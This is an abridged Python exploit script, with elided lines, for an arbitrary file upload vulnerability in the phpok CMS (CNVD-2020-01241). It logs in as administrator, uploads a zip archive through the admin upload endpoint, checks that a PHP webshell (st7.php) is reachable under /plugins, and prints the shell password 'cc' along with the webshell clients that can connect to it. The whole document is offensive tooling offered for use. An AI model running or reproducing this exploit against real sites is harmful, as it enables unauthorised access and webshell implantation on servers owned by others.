...
code = 'CNVD-2020-01241'
version = '0.5'
author = 'TesterCC'
vulDate = '2020-03-19'
createDate = '2020-03-19'
updateDate = '2020-03-19'
name = 'phpok v5.4任意文件上传漏洞 (CNVD-2020-01241)'
appPowerLink = 'www.phpok.com'
appName = 'phpok'
appVersion = 'version < phpok v5.4'
way = 'python CNVD-2020-01241.py -l http://10.0.4.151 -u admin -p 123456'
...
def verify():
    ...
    url1 = url + "/api.php?c=vcode&id=admin&_noCache=0.24756591788411075"
            ...
            while True:
                ...
                if "管理员密码输入不正确" in str(resp.text):
                    ...
                    if resp1.status_code == 200:
                        ...
                        time.sleep(0.3)
                        print("[+] 跳转成功！")
                        path1 = "/admin.php?c=upload&f=zip&name=st7.zip"
                        ...
                        if resp2.status_code == 200 and str(resp2.json()['status']) == "ok":
                            ...
                            time.sleep(1)  # 应该需要等待时间
                            address4 = url + "/plugins/st7.php"
                            ...
                            if resp3.status_code == 200 and resp4.status_code == 200:
                                ...
                                time.sleep(0.3)
                                print("[+] shell密码为：cc")
                                print("[+] 可用Cknife、AntSword等工具进行链接")
                                endtime()
                            else:
...
if __name__ == "__main__":
    ...
    parser.add_option('-l', '-L', dest='url', type='string', help='target url',
                      default="http://10.0.4.151")  # 需要的命令行参数
